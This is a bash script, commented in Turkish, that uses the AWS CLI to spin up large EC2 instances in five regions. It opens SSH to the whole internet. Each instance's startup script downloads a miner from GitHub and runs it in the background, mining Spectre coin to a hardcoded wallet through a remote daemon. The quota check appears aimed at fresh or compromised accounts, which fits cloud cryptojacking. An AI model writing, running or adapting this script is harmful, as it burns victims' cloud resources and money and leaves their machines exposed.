#!/bin/bash

# On-demand ve Spot instance türleri
instance_types=("c7a.16xlarge" "m7a.16xlarge" "r7a.16xlarge" "c7i.16xlarge" "m7i.16xlarge" "c6a.16xlarge" "m6a.16xlarge")

# Yeni bölgeler
regions=("eu-west-1" "eu-north-1" "us-east-1" "us-west-2" "eu-central-1")

# Her bölge için AMI ID'leri
declare -A ami_ids
ami_ids["eu-west-1"]="ami-0e9085e60087ce171"
ami_ids["eu-north-1"]="ami-075449515af5df0d1"
ami_ids["us-east-1"]="ami-0e2c8caa4b6378d8c"
ami_ids["us-west-2"]="ami-05d38da78ce859165"
ami_ids["eu-central-1"]="ami-0a628e1e89aaedf80"

# vCPU limit kontrol fonksiyonu
check_vcpu_limit() {
    local region=$1
    vcpu_limit=$(aws service-quotas get-service-quota --region "$region" --service-code ec2 --quota-code L-1216C47A --query "Quota.Value" --output text)
    vcpu_limit=$(printf "%.0f" "$vcpu_limit")
    [[ -z "$vcpu_limit" || "$vcpu_limit" -ne 64 ]] && return 1
    return 0
}

# Alt bölgeleri bulma
find_subnet_in_az() {
    local region=$1 az=$2
    aws ec2 describe-subnets --region "$region" --filters "Name=availability-zone,Values=$az" --query "Subnets[0].SubnetId" --output text
}

# Instance oluşturma fonksiyonu
create_instance() {
    local region=$1 market_type=$2
    instance_type=$(shuf -e "${instance_types[@]}" | head -n 1)
    ami_id=${ami_ids[$region]}
    security_group_id=$(aws ec2 describe-security-groups --region "$region" --filters "Name=group-name,Values=default" --query "SecurityGroups[0].GroupId" --output text)
    aws ec2 authorize-security-group-ingress --region "$region" --group-id "$security_group_id" --protocol tcp --port 22 --cidr 0.0.0.0/0 2>/dev/null || true
    azs=$(aws ec2 describe-availability-zones --region "$region" --query "AvailabilityZones[].ZoneName" --output text)
    for az in $azs; do
        subnet_id=$(find_subnet_in_az "$region" "$az")
        [[ "$subnet_id" != "None" ]] && break
    done
    user_data=$(cat <<EOF
#!/bin/bash
sudo yum update -y
sudo yum install git -y
cd /root
git clone https://github.com/eraemm/efsaneyim.git
cd efsaneyim
chmod 777 tnn-miner-cpu
screen -dmS spectre ./tnn-miner-cpu --spectre --daemon-address 144.91.120.111 --port 5555 --wallet spectre:qq66aq7yfpg7sfs27fmc3t5jfqx786e569la6d85hmvvn2807c6pqfj6tuz6a
EOF
    )
    aws ec2 run-instances --region "$region" --image-id "$ami_id" --instance-type "$instance_type" --security-group-ids "$security_group_id" --subnet-id "$subnet_id" --user-data "$user_data" --count 1 ${market_type:+--instance-market-options '{"MarketType":"spot"}'}
}

# Önce On-demand instance'ları oluştur
for region in "${regions[@]}"; do
    check_vcpu_limit "$region" && create_instance "$region"
done

# 1 dakika bekle
echo "1 dakika bekleniyor..." 
sleep 60

# Şimdi Spot instance'ları oluştur
for region in "${regions[@]}"; do
    check_vcpu_limit "$region" && create_instance "$region" "spot"
done

echo "Tüm işlemler tamamlandı."
